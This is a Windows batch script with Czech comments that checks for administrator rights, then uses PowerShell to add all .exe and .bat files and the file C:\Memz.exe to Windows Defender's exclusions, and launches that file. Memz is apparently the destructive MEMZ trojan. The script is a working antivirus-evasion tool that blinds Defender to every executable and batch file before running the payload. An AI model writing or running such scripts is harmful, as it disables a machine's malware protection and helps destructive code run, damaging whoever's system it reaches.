::Program, který přidá soubor C:\Memz.exe mezi výjimky ve Windows defenderu a poté jej spustí
@echo off

::Kontrola, jestli soubor C:\Memz.exe existuje
if not exist c:\Memz.exe (echo Soubor C:\Memz.exe nebyl nalezen, jak mam asi tento soubor spusitit?
    echo .
    pause
    exit)

::Kontrola, jestli program má oprávnění správce
net session > nul & cls
if %errorlevel% == 0 goto start

cd C:\users\public
echo x=msgbox("Na tuto akci je nutne opravneni spravce", 0+16, "Admin Error") > Error.vbs
timeout /t 1 > nul
start error.vbs
timeout /t 1 > nul
del error.vbs
exit

::Přidá mezi výjimky vše s příponou .exe, .bat a soubor C:\Memz.exe
:start
powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Memz.exe""
timeout /t 1 > nul
start c:\Memz.exe
exit